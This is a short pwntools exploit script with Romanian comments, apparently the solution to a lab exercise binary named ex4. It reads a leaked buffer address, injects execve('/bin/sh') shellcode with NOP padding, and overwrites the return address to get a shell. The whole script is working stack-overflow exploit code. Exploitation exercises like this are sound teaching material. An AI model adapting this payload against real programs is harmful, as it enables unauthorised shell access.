#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", os="linux")

target = process("./bin/ex4")

# 1. Citim adresa buffer-ului din output-ul programului
line = target.recvline().decode()
print(f"[+] Leak: {line.strip()}")
buffer_addr = int(line.split("at ")[1].strip(), 16)
print(f"[+] Buffer la: {hex(buffer_addr)}")

# 2. Construim shellcode pentru execve("/bin/sh", NULL, NULL)
# Syscall execve = 59 pe x86_64
shellcode = asm(f"""
    mov rdi, {buffer_addr + 200}   # pointer la "/bin/sh"
    xor rsi, rsi                   # argv = NULL
    xor rdx, rdx                   # envp = NULL
    mov rax, 59                    # syscall number
    syscall
""")

# 3. Construim payload-ul
payload  = shellcode                       # shellcode la începutul buffer-ului
payload += b"\x90" * (200 - len(shellcode))  # NOP padding
payload += b"/bin/sh\x00"                  # șirul "/bin/sh" la offset 200
payload += b"A" * (264 - len(payload))     # padding până la return address
payload += p64(buffer_addr)                # suprascriem return address cu adresa buffer-ului

print(f"[+] Payload size: {len(payload)} bytes")

# 4. Trimitem și obținem shell
target.sendline(payload)
target.interactive()
